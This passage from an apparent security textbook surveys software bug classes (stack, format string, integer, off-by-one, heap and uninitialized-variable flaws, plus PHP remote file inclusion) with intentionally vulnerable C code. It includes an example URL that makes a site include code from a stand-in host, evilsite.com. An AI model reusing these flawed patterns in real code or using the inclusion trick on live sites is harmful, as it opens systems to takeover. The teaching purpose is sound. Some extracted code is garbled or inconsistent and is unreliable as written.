This is not always the case, although user education is a big part of a corporate
security policy.11 So IT must deal with software failure, misconfigurations, users,
physical access problems, and more. This is why the CISSP and similar exams were
2.2
People Conducting Vulnerability Analysis
41
10The ‘grep’ utility is the best known tool for searching for specific strings in text-based data,
such as source code.
11For more information on creating a security policy see www.sans.org/resources/policies
created to prove that a security specialist has knowledge of all domains.12 These
certifications are particularly important if you want to do corporate security con-
sulting (another great paying job, but typically involves a lot of travel).
2.3
Target Software
In testing, analyzing, fuzzing, hacking, or whatever, the target system, target soft-
ware, or target application is always the subject of interest. For example, if gftp.exe
is of interest to test for remotely exploitable bugs, the target would be the
gftp.exe binary or its source code.
Choosing the target is a trivial matter for software testers since they will always
be testing whatever software their company is producing. However, for bug hunters
the choice is a little more complex. Some bug hunters are given a free rein mission:
Go forth and find as many exploitable bugs in products in use on the Internet.
So which product should a bug hunter look at? Perhaps the bug hunters should
start with products they are interested in or already understand. For example, if
you have tools for auditing C code, are good at it, and have access to the code, per-
haps looking at something coded in C would be a good idea. Or if you like to fuzz
network servers when no source code is available and are familiar with clear text
protocols like FTP, SMTP, IMAP, etc. perhaps they would be a good choice. But
even then, should you focus on big name products like IIS FTP (no known secu-
rity issue since 2000) or lower hanging fruit like the free version of Golden FTP
(multiple possible security bugs found in 2007 alone)? Golden FTP is more likely to
have bugs because it is unlikely its development process is as rigorous as that of a
widely used commercial product. Yet if a bug could be found in a Microsoft prod-
uct, for example, the payoff (in dollars or fame) is much higher.
2.4
Basic Bug Categories
Once a target is selected, it pays to know what kind of bugs are out there to find.
There are many types of bugs to be found in software. Many can be uncovered with
fuzzers, particularly those of the memory access violation variety. Many of the
bugs/attacks will be briefly described below. Keep in mind that whole papers have
been written on the specifics of each bug and the intricacies of exploitation, and
this is intended only as an overview.
2.4.1
Memory Corruption Errors
Memory corruption errors have been the most prevalent and effective method for
maliciously exploiting a remote or local computer system. If memory can be cor-
rupted (a return address, the GOT, SEH pointer, function pointer, etc.) often exe-
cution can be redirected to attacker supplied code.
42
Software Vulnerability Analysis
12For more information on the 10 security domains, see www.isc2.org
The words “buffer overflow” are common in the security field and are gener-
ally understood to mean “bad things are happening.” While this is true, it’s not pre-
cise. For example, a static buffer on the stack can be overrun, or a buffer allocated
in the heap could be overrun. Both are overflows or buffer overflows. Both are tra-
ditionally exploitable. However, one was a stack overflow, and the other a heap
overflow. We’ll define each to achieve an appreciation for the variety of bug types.
A basic understanding of how to exploit each type will be discussed as well.
2.4.1.1
Stack Overflows
A stack overflow involves memory on the stack getting corrupted due to improper
bounds checking when a memory write operation takes place. A simple snippet of
C demonstrates this concept (Figures 2.4 and 2.5).
Granted this example is shown on Vista, so this bug could not actually be ex-
ploited beyond a denial of service due to Microsoft’s recent security enhancements
(more on that later). But other stack overflow scenarios or this code on older plat-
forms could be exploited to execute malicious code provided by the attacker.13
2.4.1.2
Format String Errors
The format string bug was big in the late 1990s when it was first discovered. It has
since gone out of style since it is so easily detected by static analysis (source code
auditing) tools. The names “format string bug,” “format string vulnerability,” or
FSE (format string exceptions) stem from two things: the functions in which the
bugs can happen (printf() type functions) and the “format” characters that are used
to create output. For example, a valid snippet of code would be
printf("%s", user_supplied_buff);
But an invalid usage would be
#include 
Int my_format_func(char * buff)
{
printf(buff);
}
int main(int argc, char * argv[])
{
my_format_func(argv[1]);
}
When programmers made such mistakes, they were overlooked or thought
harmless because the application still executed as intended. If you compile this
example, it is interesting to see that when a %x is supplied as the argument to
this program, the data printed is not a %x as you might expect. Something like
2.4
Basic Bug Categories
43
13www.eweek.com/article2/0,1895,2076062,00.asp is just one example of a Vista attack.
44
Software Vulnerability Analysis
Figure 2.5
A register and stack trace from a debugger of above attack.
Figure 2.4
Demonstration of a stack overflow.
“bfc07d10” is returned. This is because printf used the %x as the format charac-
ter. The normal arguments on the stack for a printf(“%x”, num); would be the
“%x” (format character), and the number that the programmer wants printed. In
our example, the printf printed the next value on the stack after the “format
string,” as it was instructed to do. In this case, since there was no legitimate data to
be printed, it grabs and prints the next value that happened to be on the stack (like
a local variable, frame pointer (ebp), return address, etc.). So this technique could
be used to scan the stack memory for interesting values. Similarly, a %d, %s, and
more will print values off the stack. However, the %n can be used to write a value
in memory. %n prints the number of bytes formatted to an address specified on
the stack. A typical exploit would use a combination of these techniques to over-
write a library function pointer or return address to gain control of the program.14
The following snippet of code and screen shot (Figure 2.6) give a demonstration
of another format string in action:
int main(int argc, char * argv[])
{
if( argc !=2 )
{
printf("Not enougy args, got:\r\n");
printf(argv[1]);
exit(-1);
}
printf("Doing something useful in this part of code.\r\n");
}
Figure 2.6 shows the execution of that code. As the parameters (the %s%x) are
changed, varying information could be extracted off the stack or modified.
2.4
Basic Bug Categories
45
Figure 2.6
Demonstration of a format string vulnerability.
14The paper found at http://julianor.tripod.com/teso-fs1-1.pdf gives a good detailed explanation.
2.4.1.3
Integer Errors
This class of bugs is commonly referred to as an integer overflow, but this label
isn’t completely descriptive. Numerical wrapping, field truncation, or signedness
problems might be more descriptive terms. Review the following snippet of code:
#include 
#include 
int calc(unsigned short len, char * ptr) //implicit cast to short
{
if(len >= 10)
return -1;
printf("s = %d\n", len);
return 0;
}
int main(int argc, char *argv[])
{
int i;
char buf[10];
//static buf == bad
if(argc != 3)
{
printf("Bad args\r\n");
return -1;
}
i = atoi(argv[1]);
if( calc(i, argv[2]) == -1)
{
printf("Oh no you don't!\n");
return -1;
}
memcpy(buf, argv[1], i);//using the int version of the len
buf[i] = '\0';
printf("%s\n", buf);
return 0;
}
Figure 2.7 shows the execution of the code. Why does the program crash when
provided the string “65536”? Note that the input is cast as a signed integer by
atoi(argv[1]). It is then recast as an unsigned short by the “s = i;” code. An int or
dword on most systems is 32 bits. The original string input was translated to
46
Software Vulnerability Analysis
0x00010000. Since a short is only 16 bits, that was truncated to 0x0000. Thus, s
was less than 10, but i=65536, which is enough to clobber the 10-byte buffer in the
memcpy(buf, argv[2], i).
Other similar errors such as a malloc(s=0) could have happened to create a null
buffer and a consequent null pointer crash when it was next used in a memory oper-
ation. Also, if a number is read in as signed or unsigned, but then used as the oppo-
site in a later comparison, similar issues can occur.
2.4.1.4
Off-by-One
An off-by-one error typically indicates that one too many bytes have been written
to a particular buffer. On some systems (particularly little endian architectures, like
Intel’s x86 architecture), this can lead to an exploitable condition if the buffer is
directly next to the frame pointer (ebp) or some other function pointer.15 A typical
bad slice of code might look like:
int off_by_one(char *s)
{
char buf[32];
memset(buf, 0, sizeof(buf));
strncat(buf, s, sizeof(buf));
}
The strncat copies one too many bytes, because it copies the stated size,
sizeof(buf), plus one extra byte, a NULL or 0x00. Again, if this buffer is right next
to the frame pointer ebp, it would become something like 0x08041200. The least
significant byte (LSB) became null. An x86 stack wind/unwind is as follows:
1. pushes
a. Puts function arguments on the stack
2. call
a. Pushes the next executable instruction address (return address) to stack
2.4
Basic Bug Categories
47
Figure 2.7
Executing the example code with off-by-one error.
15This is the same basic problem as a standard stack overflow, except that the exploitation is
different.
3. entr
a. Pushes ebp to stack
b. Sets ebp = esp
c. Makes room for local variables on the stack by subtracting that amount
from the stack pointer
4. leave
a. Sets esp = ebp
b. Pops dword from esp → ebp
5. ret
a. Pops dword from esp → eip
If the saved ebp was corrupted, the stack pointer preceding the second return
will not be in the correct place. Since the LSB was “nulled,” it is possible that when
the return executes, esp will be pointing in the user-supplied buffer that caused the
off-by-one error. This could lead to a compromise, or as is generically said, “arbi-
trary code execution.” Stack padding done by some compilers can mitigate such
attacks. And of course, other newer protections (yet to be described) can also mit-
igate such attacks.
2.4.1.5
Heap Overflow
A heap overflow is when data is written beyond the boundary of an allocated chunk
of memory on the heap. Heap memory (in C/C++) is allocated at run-time with the
malloc() family of functions. As with stack overflows, control information is stored
in-band, which, when overwritten with attacker-supplied data, can allow execution
redirection. As with stack overflows, there are various ways and circumstances
under which this vulnerability will be exploitable or not. Various protections, such
as heap integrity checking, can be put in place to help prevent such attacks.
Exploiting in-band heap information is a little more complex than overwriting
a stack return address or SEH pointer. It is also very dependent on the specific
implementation of the malloc library of interest. This is no surprise, since even
exploiting stack overflows is different for Windows and Linux, so certainly it will
be different with heap attacks. A detailed explanation of a heap overflow on vari-
ous platforms is beyond the scope of this book. For now, it’s enough to understand
that a traditional dlmalloc (the “Doug Lea” malloc implementation on GNU libc)
involves the removal of a corrupted item from a doubly linked list. When the meta-
data to this item is corrupted, it gives the attacker the ability to perform an arbitrary
4-byte write anywhere in memory. Typically, a function pointer in the GOT, or a
stack return address, will be overwritten with an address that points to shellcode.
The next time that function (say printf) is called, or when the function returns,
attacker code will be executed.
2.4.1.6
(Uninitialized) Stack or Heap Variable Overwrites
This is a newer class of bugs, and one that is often difficult to successfully exploit.
Examine the following example:
48
Software Vulnerability Analysis
int un_init(char *s) {
char buf[32];
int logged_in;
if ( strlen(s) > 36)
{
printf("String too long!\r\n");
logged_in =0;
}
else
strncpy(buf, s, strlen(s) );
if (logged_in == 0x41414141)
printf("hi -- you should never see this, because logged_in is
never set by program code.\r\n"); }
int main(int argc, char * argv[])
{
un_init(argv[1]);
}
# ./uninitialized aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbCCCCDDDD
String too long!
# ./uninitialized aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbCCCC
# ./uninitialized aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbAAAA
hi -- you should never see this, because logged_in is never set by
program code.
Note there is an integer in the program that is never initialized to a value. In this
example, since a straight overwrite occurs, it is irrelevant that it is uninitialized, but
in some cases that is key. In this simple case, if just the right string is sent, the inter-
nal operation of the program can be alerted in ways not intended. Whether variable
overwrites are exploitable is always application dependant and requires a heavy
amount of reverse engineering and code flow analysis.
2.4.1.7
Other Memory Overwrites
As we have seen from stack, heap, and variable overflows, any time an attacker can
modify the internal memory of an application in unintended ways, bad things can
happen, including the attacker’s gaining complete control of the system. Thus, we
should not be surprised to learn that if data in other parts of the program can be
modified, an attack might also succeed. Overwriting function pointers is another
attacker favorite. Also, credential information stored in the BSS or data segment
could be interesting to read from (think format string bug) or write to. The point is
if arbitrary memory read or writes are possible, unintended consequences may
result.
2.4
Basic Bug Categories
49
2.4.2
Web Applications
The Internet has been growing exponentially since its inception. With 7.3 million
pages being added each day,16 it is safe to assume a secure future for those auditing
web applications for security. We will examine some common web bugs. Note that
these types of problems are not unique to the web. For example, VoIP systems are
known to have all the same types of flaws, as can any other system that will pass
user-provided data forward to a script, database, or any other system.
2.4.2.1
PHP File Inclusions
PHP is one of the many programming languages used to create interactive web
pages. A remote file inclusion (RFI) is an attack that sometimes allows an attacker
to run his own code on a website. Register_globals is ON by default in PHP ver-
sions pervious to 4.2.0. When the register_globals parameter is ON, all the EGPCS
(Environment, GET, POST, Cookie, and Server) variables are automatically regis-
tered as global variables. This allows attackers to define a variable by simply edit-
ing a URL. For example, consider the following vulnerable line of PHP:
include($mypage . '/specialfile.php');
Links from this application may appear as follows:
www.nicecompany.com/index.php?mypage=localfiles
But, because the $mypage variable isn’t specially defined, the URL could be
manually edited to this:
www.nicecompnay.com/index.php?mypage=http://www.evilsite.com/
The include function instructs the server to retrieve the remote file and run its
code. If this server is running a vulnerable version of PHP, the attacker would now
have a webshell, sometimes referred to as a c99 shell (all without any type of buffer
overflow, shellcode, etc!). The c99 allows the attacker to view and edit files as well
as possibly elevate privileges. Again, newer versions of PHP have corrected this
error by setting the register_globals to OFF (although some administrators will turn
this back on because older applications may require it). Other measures such as
clearly defining all variables and safer URL parsing should also be implemented.
Another important configuration parameter is the “open_basedir” parameter,
which should be set to the base directory where the main site file (index.php in this
case) is located. This prevents attackers from reading in any local file from the web
server by restricting access to the preconfigured directory. This is especially impor-
tant in a shared hosting environment.
2.4.2.2
SQL Injections